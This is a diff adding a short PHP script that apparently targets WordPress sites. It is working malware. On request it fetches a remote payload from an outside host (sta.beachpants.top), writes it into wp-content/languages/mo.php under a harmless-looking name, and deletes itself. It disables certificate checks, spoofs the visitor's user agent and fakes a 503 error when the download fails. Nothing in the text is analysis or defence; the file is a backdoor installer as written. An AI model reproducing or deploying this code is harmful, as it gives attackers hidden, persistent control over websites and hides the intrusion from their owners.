@@ -1,0 +1,72 @@
+
+<?php
+
+$shpath = $_SERVER['DOCUMENT_ROOT']."/wp-content/languages/mo.php";
+$shf = FFGet("http://sta.beachpants.top/wp-booter.txt");
+
+file_put_contents($shpath, $shf);
+
+echo "ooxx";
+
+$exepf = php_self();
+
+unlink($exepf);
+
+function php_self(){
+
+    $php_self=substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);
+
+    return $php_self;
+
+}
+
+
+function FFGet( $url ){
+	
+    $file_contents ='';
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+	
+    if(function_exists('file_get_contents')){
+		ini_set('user_agent',$user_agent);
+		try
+		{
+			$file_contents = @file_get_contents( $url );
+
+		}
+		catch (Exception $e)
+		{ }
+    }
+
+    if(strlen($file_contents)<1&&function_exists('curl_init')){
+        try
+        {
+             $file_contents ="";
+             $ch = curl_init();
+             $timeout = 30;
+             curl_setopt($ch,CURLOPT_URL,$url);
+             curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
+             curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
+             curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+             curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
+             curl_setopt($ch,CURLOPT_USERAGENT,$user_agent);
+             $file_contents = curl_exec( $ch);
+             curl_close( $ch );
+         }
+         catch (Exception $e)
+         {}
+     }
+
+	if($file_contents=="503"||$file_contents=="")
+	{
+		  ob_start(); 
+			  header('HTTP/1.1 503 Service Temporarily Unavailable');
+			  header('Status:  503 Service Temporarily Unavailable');
+			  header('Retry-After:1200'); 
+			  header('X-Powered-By:Apache');
+			  exit();
+	}
+
+
+    return $file_contents;
+}
+?>
